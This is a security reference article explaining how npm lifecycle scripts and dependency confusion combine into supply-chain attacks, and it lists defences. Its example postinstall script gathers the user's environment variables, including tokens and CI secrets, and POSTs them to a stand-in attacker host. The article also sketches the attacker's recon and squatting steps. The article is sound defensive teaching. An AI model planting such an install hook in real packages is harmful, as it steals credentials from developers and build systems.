---
title: "npm Lifecycle Scripts & Dependency Confusion"
date: 2026-06-09
category: supply-chain
tags: [security, supply-chain, npm, dependency-confusion]
breadcrumb: "Security > Supply Chain > npm Lifecycle Scripts"
---

# Security › Supply Chain › npm Lifecycle Scripts

## What it is

When you run `npm install <package>`, npm doesn't just download files — it
*runs code*. Every package can define **lifecycle scripts** in its
`package.json` that npm executes automatically, with no prompt and no review:

```json
{
  "scripts": {
    "preinstall":  "node setup.js",
    "install":     "node-gyp rebuild",
    "postinstall": "node phone-home.js"
  }
}
```

`preinstall`, `install`, and `postinstall` all fire during a normal
`npm install`. They run **arbitrary shell commands as your user** — the same
access you have to your env vars, `~/.ssh`, `~/.npmrc`, `~/.aws/credentials`,
and any cloud metadata reachable from the box.

Two facts turn this into a supply-chain primitive:

1. **Scripts run for dependencies, not just the package you named.** Install
   package A, and the `postinstall` of every transitive dependency runs too —
   packages you've never heard of, pulled in three levels deep. A typical
   project resolves hundreds of them.
2. **You never see it happen.** The output scrolls past in the install log, if
   it prints anything at all. There is no consent step.

This is the execution half of most npm supply-chain attacks. The other half is
*delivery* — getting a malicious package onto your machine in the first place.
**Dependency confusion** is the most common delivery trick, so it's covered
here too.

---

## How it works

```
   ┌───────────┐   npm install    ┌─────────────┐   resolves &   ┌──────────────┐
   │ Developer │ ───────────────▶ │  npm client │ ─────────────▶ │  registry    │
   │  / CI      │                 │             │   downloads    │ (npmjs.com)  │
   └───────────┘                 └──────┬──────┘                 └──────────────┘
                                        │ runs lifecycle scripts
                                        ▼  (preinstall/install/postinstall)
                              ┌──────────────────────┐
                              │  attacker's code,    │
                              │  as YOUR user         │
                              └──────────┬───────────┘
                                         ▼
                              ┌──────────────────────┐
                              │ env vars, ~/.npmrc    │
                              │ tokens, SSH keys,     │
                              │ AWS creds, cloud meta │
                              └──────────────────────┘
```

The attacker needs:

1. A package they control that ends up in your dependency tree.
2. A lifecycle script (`preinstall` / `install` / `postinstall`) carrying the
   payload.
3. You (or your CI) to run `npm install` without `--ignore-scripts`.

### Two lifecycle scripts: the install half

A real-world `postinstall` payload does roughly this:

```js
// postinstall — runs automatically on `npm install`
const os = require("os");
const https = require("https");

const profile = {
  user: os.userInfo().username,
  host: os.hostname(),
  cwd: process.cwd(),
  env: process.env,                 // tokens, CI secrets, registry creds
};

https.request("https://attacker.example/collect", { method: "POST" })
  .end(JSON.stringify(profile));
```

That is exactly the shape Microsoft described in the *33 malicious npm
packages* writeup: `postinstall` → fingerprint the developer/CI environment →
exfiltrate over HTTP. No exploit, no CVE — just the documented behaviour of
`npm install`.

### Dependency confusion: the delivery half

Execution is useless if the package never reaches you. Dependency confusion is
how attackers get there without compromising anything:

1. Your org uses a **private** internal package, e.g. `@acme/logger`, served
   from a private registry.
2. The attacker publishes a **public** package on npmjs.com with the **same
   name** and a **higher version number** (`99.0.0`).
3. If your npm/CI is misconfigured — no scope pinned to the private registry,
   or both registries searched and "highest version wins" — the resolver pulls
   the **public, malicious** copy.
4. Its `postinstall` runs. Delivery + execution, end to end, with no insider.

> The name leaks more often than you'd think: internal package names appear in
> committed `package.json` files, public source maps, Docker layers, and CI
> logs. That's all an attacker needs to register the public squat.

### Typical flow

1. Recon for an internal package name (leaked `package.json`, source map, build
   log).
2. Publish a public package of that name with a high version and a
   `postinstall` payload — or typosquat a popular name (`expres`, `lodahs`).
3. Wait for a developer or CI to `npm install`.
4. The lifecycle script fires and beacons the harvested environment back.

---

## Impact

- Steal npm tokens (`~/.npmrc`), letting the attacker publish *more* malicious
  versions of packages you own — the worm step.
- Harvest CI secrets, cloud creds, and SSH keys present in the install env.
- Code execution on developer laptops and build agents alike.
- Downstream supply-chain compromise: a poisoned build ships to *your* users.

---

## Defenses

- **Disable scripts by default** — `npm install --ignore-scripts`, or set
  `ignore-scripts=true` in `.npmrc`. Re-enable per-package only for the few that
  genuinely need a native build. This kills the execution half outright.
- **Pin scopes to your private registry** in `.npmrc`
  (`@acme:registry=https://registry.acme.internal`) so `@acme/*` is *never*
  resolved from public npm — the core dependency-confusion fix.
- **Lockfiles + `npm ci`** — install exact, reviewed versions; `npm ci` fails
  on any drift from `package-lock.json`.
- **Don't let CI hold long-lived secrets at install time** — scope tokens, use
  OIDC, and treat the install step as untrusted code execution.
- **Vet new and updated dependencies** — sudden version jumps, fresh
  maintainers, or a package that newly added a `postinstall` are red flags.
- **Egress control on build agents** — block arbitrary outbound HTTP and the
  cloud metadata endpoint (`169.254.169.254`) so a payload can't beacon out.

---

## Sources

- npm Docs — *scripts* (lifecycle hooks):
  <https://docs.npmjs.com/cli/v11/using-npm/scripts>
- Microsoft Security — *33 malicious npm packages abuse dependency confusion to
  profile developer environments* (2026):
  <https://www.microsoft.com/en-us/security/blog/2026/05/29/33-malicious-npm-packages-abuse-dependency-confusion-profile-developer-environments/>
- Alex Birsan — *Dependency Confusion* (original 2021 research):
  <https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610>
